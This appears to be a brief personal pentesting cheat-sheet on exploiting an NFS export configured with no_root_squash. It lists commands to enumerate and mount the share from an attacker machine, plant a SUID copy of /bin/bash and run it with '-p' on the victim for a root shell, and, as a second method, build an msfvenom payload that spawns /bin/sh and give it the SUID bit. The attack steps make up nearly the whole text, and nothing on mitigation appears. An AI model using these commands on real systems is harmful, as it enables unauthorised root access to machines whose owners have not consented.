
###### `NFS` take use of `rpcbind` protocol for established connection between clint and server, So if you see that `rpcbind` protocol is open then probably `NFS` could be open too 



###### Command for find which things are shared by the target using `NFS` 
```
showmount -e <target_ip>
```

###### Connect with target using `NFS` 
```
mkdir /mnt/tmp     # run this command inside attacker system
mount -o rw,vers=3 <target_ip>:/tmp /mnt/tmp
```

--------------

The vulnerability is: `no_root_squash`,
it not allow user is root or not

-------------------------
#### First method:

```
cp /bin/bash /mnt/tmp/bash
```

```
chmod +sx bash
```

Victim system 
```
./bash -p
```




-----------------
#### Second method: 
###### Create a payload using `msfvemon`
```
msfvenom -p linux/x64/exec CMD="/bin/sh" -f elf -o shell
```

###### Set SUID bit 
```
chmod +sx shell
```


